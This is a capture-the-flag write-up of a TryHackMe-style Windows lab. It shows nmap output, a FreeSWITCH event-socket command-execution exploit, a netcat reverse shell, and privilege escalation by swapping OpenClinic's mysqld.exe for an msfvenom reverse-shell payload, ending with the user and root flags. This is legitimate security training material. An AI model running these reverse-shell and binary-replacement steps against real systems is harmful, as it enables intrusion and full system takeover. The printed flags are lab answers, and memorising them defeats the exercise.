# IP
10.10.3.107

## Enumeration
### Nmap
Found two ports running on the machine.
```console
PORT     STATE SERVICE          REASON  VERSION
3389/tcp open  ms-wbt-server    syn-ack Microsoft Terminal Services
|_ssl-date: 2022-10-29T05:11:15+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-10-29T05:11:14+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Issuer: commonName=WIN-EOM4PK0578N
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-10-28T05:05:20
| Not valid after:  2023-04-29T05:05:20
| MD5:   e6ce 91de 1265 caf1 3131 4fb3 7622 2ba2
| SHA-1: 2e90 4381 7139 e719 d81a f97a 0e5d 871e b5ae c355
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQaLFaTx2iRaBKNvil2qeZ0jANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tRU9NNFBLMDU3OE4wHhcNMjIxMDI4MDUwNTIwWhcNMjMw
| NDI5MDUwNTIwWjAaMRgwFgYDVQQDEw9XSU4tRU9NNFBLMDU3OE4wggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDWf28IblvG1kVpHcjSuEOpgm8ukuI6D1AO
| sCurJ0+3Mz3EBd5semclzGVpa1t5lePd8mu81/3Xep8amsZVuibcytbdoiPPEHoO
| bCoPsgrXstCEiINgYIywDKe8hhbD/7Vn+NZVzwdt543XLi+LI82isGqdwdy8+gpd
| GEWSG9/C2PFZP/izTitjDPEeMmXGWrTUxppR4kUZZyoLXl6mJV7483lzbyWzNY2L
| tBdRDjssaNS9u0vzHvUdugifXZtSkHigtAFrjI2tYR2Fcue7vA069PgKoJELsmY1
| EJBObaYhAVGe/9ouwTXUT+EDFFwpKnksya3DOQ7RHUBUmJrjnikFAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAsVrgbcWxZnt2oNOFyi/TUkSRY4xlsj4/2fpg6ctRA7Ij0h2U3hg4H9fH
| xllWX3bVMcfDb87JjV/XUquRL1MSY/rOpDCt3TxPW1Z/KgB9CB8AlyUJasYc/pQo
| IgnVZeWIJC1Q6Gjs+JbyE1wGmj8C96Do6bX/3q6t2MHHHUDeNvXJRyuUqX9DqHo1
| cq0VxGnOdq1w11fZ+NFaA4zkXlomz3/DINMIL771DZkhp/3x3x1ZKiPt6b+9orla
| urh5OGhrdN+C3btyi2+f+T0+wIU4S5EqUb7Gc0xrFywCGJ485djPwxUom98K3qMV
| +zqoqWGyZ/XKUIAmpbzw2Oh6HTivNg==
|_-----END CERTIFICATE-----
8021/tcp open  freeswitch-event syn-ack FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
```

On searching exploits for these service found Command execution exploit for `FreeSWITCH`.
```console
❯ searchsploit freeswitch
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)                                                                                             | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                                                                                                | windows/remote/47799.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


## Exploit
### FreeSWITCH ([1.10.1](https://www.exploit-db.com/exploits/47799))
- Downloaded exploit from searchsploit 
```console
❯ searchsploit -m windows/remote/47799.py
  Exploit: FreeSWITCH 1.10.1 - Command Execution
      URL: https://www.exploit-db.com/exploits/47799
     Path: /usr/share/exploitdb/exploits/windows/remote/47799.txt
File Type: Python script, ASCII text executable
Copied to: /home/divu050704/tryhackme-notes/flatline/47799.txt
```
- On reading code found out that we need to provide to arguments to the exploit.
1. Target
2. Command
- Ran exploit for the first time with `whoami` command
```console
❯ python3 exploit.py 10.10.210.187 whoami
Authenticated
Content-Type: api/response
Content-Length: 25
win-eom4pk0578n\nekrotic
```
- Uploaded a static `nc.exe` binary to the system.
- Started a reverse shell with `nc.exe`.
```console
❯ python3 exploit.py 10.10.210.187 "nc.exe 10.17.0.215 4444 -e cmd.exe"
Authenticated
```
- Got a reverse shell.
```console
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.210.187] 49867
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Program Files\FreeSWITCH>
```
- Found `user.txt`.
```console
C:\Users\Nekrotic\Desktop>
type user.txt
type user.txt
THM{64bca0843d535fa73eecdc59d27cbe26}
```

## Privilege Escalation
- Followed this [exploit](https://www.exploit-db.com/exploits/50448)
- Started a netcat listener.
```console
❯ rlwrap nc -lvnp 4242
listening on [any] 4242 ...
```
- Created a msfvenom payload
```console
❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.17.0.215 LPORT=4242 -f exe  > mysqld_evil.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
- Uploaded to `C:\projects\openclinic\mariadb\bin`.
```console
C:\projects\openclinic\mariadb\bin> curl http://10.17.0.215/mysqld_evil.exe -o mysqld_evil.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 73802  100 73802    0     0  73802      0  0:00:01  0:00:01 --:--:-- 41814
```
- Renamed `mysqld.exe` as `mysqld.bak` and `mysqld_evil.exe` as `mysqld.exe`.
```console
C:\projects\openclinic\mariadb\bin> rename mysqld.exe mysqld.bak
C:\projects\openclinic\mariadb\bin> rename mysqld_evil.exe mysqld.exe
```
- Restarted the system with
```console
C:\projects\openclinic\mariadb\bin> shutdown /r /t 1
```
- Got a reverse shell.
```console
❯ rlwrap nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.4.10] 49670
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.
whoami
whoami
nt authority\system
C:\Windows\system32> 
```
- Found `root.txt`
```console
C:\Users\Nekrotic\Desktop> type root.txt
THM{8c8bc5558f0f3f8060d00ca231a9fb5e} 
```


